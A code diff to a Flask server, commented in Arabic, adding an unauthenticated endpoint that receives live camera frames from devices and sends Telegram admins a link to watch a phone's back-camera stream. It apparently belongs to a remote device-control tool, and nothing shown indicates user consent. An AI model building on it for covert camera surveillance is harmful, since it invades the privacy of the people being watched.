@@ -1667,6 +1667,76 @@ def _get_frame(stream_id):
     return Response(jpeg, mimetype="image/jpeg")
 
 
+# ⚡ REST endpoint لاستقبال إطارات الكاميرا عبر HTTP POST (بدون Socket.IO)
+@app.route("/api/device/camera-frame", methods=["POST"])
+def _api_camera_frame():
+    """يستقبل إطارات الكاميرا عبر HTTP POST مباشر"""
+    try:
+        stream_id = request.headers.get("X-Stream-Id", "")
+        frame_type = request.headers.get("X-Frame-Type", "")
+
+        # إذا فيه Content-Type: application/json → بداية/إيقاف البث
+        content_type = request.content_type or ""
+        if "application/json" in content_type:
+            data = request.get_json(force=True, silent=True) or {}
+            stream_id = data.get("stream_id", stream_id)
+            msg_type = data.get("type", "")
+
+            if msg_type == "camera_stream_start":
+                device_id = data.get("device_id", "?")
+                camera = data.get("camera", "?")
+                _camera_streams[stream_id] = {
+                    "jpeg": None,
+                    "timestamp": time.time(),
+                    "device_id": device_id,
+                    "camera": camera
+                }
+                logger.info(f"📺 Camera stream STARTED via HTTP: {stream_id} ({camera})")
+
+                # ⚡ أرسل رابط البث للبوت فقط للكاميرا الخلفية
+                if "BACK" in stream_id and mdm_bot:
+                    stream_url = f"https://one-1rre.onrender.com/live/{stream_id}"
+                    # ابحث عن الجهاز
+                    device = None
+                    for d in dm._devices.values():
+                        if d.get("device_id") == device_id:
+                            device = d
+                            break
+                    short_label = _dev_label(device) if device else device_id
+                    for admin_id in Config.ADMIN_IDS:
+                        try:
+                            mdm_bot.bot.send_message(admin_id,
+                                f"📺 <b>بث الكاميرا المباشر</b>\n\n"
+                                f"📱 <b>{short_label}</b>\n"
+                                f"📷 الكاميرا: أمامية + خلفية\n"
+                                f"━━━━━━━━━━━━━━━\n"
+                                f"🔗 <a href=\"{stream_url}\">اضغط هنا لمشاهدة البث</a>\n\n"
+                                f"⏹ لإيقاف البث: اضغط زر إيقاف بث الكاميرا",
+                                parse_mode="HTML")
+                        except Exception as e:
+                            logger.error(f"❌ Failed to send stream URL: {e}")
+                return jsonify({"success": True}), 200
+
+            if msg_type == "camera_stream_stop":
+                if stream_id in _camera_streams:
+                    del _camera_streams[stream_id]
+                logger.info(f"⏹ Camera stream STOPPED via HTTP: {stream_id}")
+                return jsonify({"success": True}), 200
+
+        # ⚡ إذا فيه X-Stream-Id + X-Frame-Type → إطار JPEG
+        if stream_id and frame_type == "camera_frame":
+            jpeg_data = request.get_data()
+            if jpeg_data and len(jpeg_data) > 100 and stream_id in _camera_streams:
+                _camera_streams[stream_id]["jpeg"] = jpeg_data
+                _camera_streams[stream_id]["timestamp"] = time.time()
+            return jsonify({"success": True}), 200
+
+        return jsonify({"success": False, "error": "unknown format"}), 400
+    except Exception as e:
+        logger.error(f"❌ camera-frame API error: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
 @socketio.on("camera_frame")
 def _sock_camera_frame(data):
     """يستقبل إطارات الكاميرا من التطبيق"""
